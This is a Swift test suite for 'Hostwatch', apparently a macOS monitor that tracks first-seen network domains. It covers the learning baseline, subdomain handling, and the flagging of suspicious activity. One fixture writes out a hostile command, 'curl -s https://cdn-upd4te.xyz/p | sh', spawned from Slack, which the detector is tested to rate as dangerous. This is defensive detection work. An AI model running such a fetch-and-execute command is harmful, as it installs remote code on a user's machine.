import Foundation
import Testing
@testable import Hostwatch

/// First-seen domains: baseline, what counts as new, and the Stories stage.
@MainActor @Suite struct Domains {
    let slack = "/Applications/Slack.app/Contents/MacOS/Slack"

    @Test func registrableDomains() {
        #expect(DomainRegistry.registrable("edge.slack.com") == "slack.com")
        #expect(DomainRegistry.registrable("a.b.example.co.uk") == "example.co.uk")
        #expect(DomainRegistry.registrable("printer.local") == nil)
        #expect(DomainRegistry.registrable("142.250.154.100") == nil)
    }

    @Test func learningIsBaselineAndSubdomainsAreNotNew() {
        let s = Scenario(learningMinutes: 60)
        s.feed(net(slack, pid: 1, to: "3.68.170.153:443", host: "app.slack.com"))
        s.feed(net(slack, pid: 1, to: "3.68.170.154:443", host: "edge.slack.com"), after: 7200)
        #expect(s.domains.newCount == 0)
    }

    @Test func firstContactAfterBaselineIsNew() {
        let s = Scenario(learningMinutes: 60)
        s.feed(net(slack, pid: 1, to: "3.68.170.153:443", host: "app.slack.com"))
        s.feed(net("/usr/bin/curl", pid: 2, to: "44.1.1.1:443", host: "httpbin.org"), after: 7200)
        #expect(s.domains.newCount == 1)
        #expect(s.domains.records["httpbin.org"].map { s.domains.isNew($0, now: s.clock) } == true)
    }

    @Test func reverseDNSAndSystemDaemonsAreNotTracked() {
        let s = Scenario()
        var ptr = net("/usr/bin/curl", pid: 3, to: "142.250.154.100:443", host: "bt-in-f100.1e100.net")
        ptr = ActivityEvent(kind: .net, time: ptr.time, pid: 3, ppid: 1, name: "curl", proc: ptr.proc,
                            target: ptr.target, extra: "TCP", parent: "", host: "bt-in-f100.1e100.net", hostSource: "ptr")
        s.feed(ptr)
        s.feed(net("/usr/libexec/locationd", pid: 4, to: "17.57.172.10:443", host: "gs-loc.apple.com"))
        #expect(s.domains.records.isEmpty)
    }

    @Test func newDomainBadgeLastsAnHour() {
        let s = Scenario()
        let first = net("/usr/bin/curl", pid: 5, to: "185.10.10.10:443", host: "cdn-upd4te.xyz")
        #expect(s.domains.observe(first, at: s.clock) == "cdn-upd4te.xyz")
        #expect(s.domains.observe(first, at: s.clock.addingTimeInterval(1800)) == "cdn-upd4te.xyz")
        #expect(s.domains.observe(first, at: s.clock.addingTimeInterval(4000)) == nil)
    }

    @Test func appShellFetchingFromNewDomainCarriesTheStage() throws {
        let s = Scenario(learningMinutes: 60)
        s.feed(exec(slack, pid: 500, ppid: 1, parent: "/sbin/launchd"))
        s.feed(net(slack, pid: 500, to: "3.68.170.153:443", host: "app.slack.com"))
        s.feed(exec("/bin/sh", pid: 510, ppid: 500, parent: slack, args: "sh -c 'curl -s https://cdn-upd4te.xyz/p | sh'"),
               after: 7200)
        s.feed(exec("/usr/bin/curl", pid: 520, ppid: 510, parent: "/bin/sh", args: "curl -s https://cdn-upd4te.xyz/p"))
        s.feed(net("/usr/bin/curl", pid: 520, to: "185.10.10.10:443", host: "cdn-upd4te.xyz"))
        let story = try #require(s.fired.first)
        #expect(story.stages.contains(.newDomain))
        #expect(story.severity == .dangerous)
    }
}
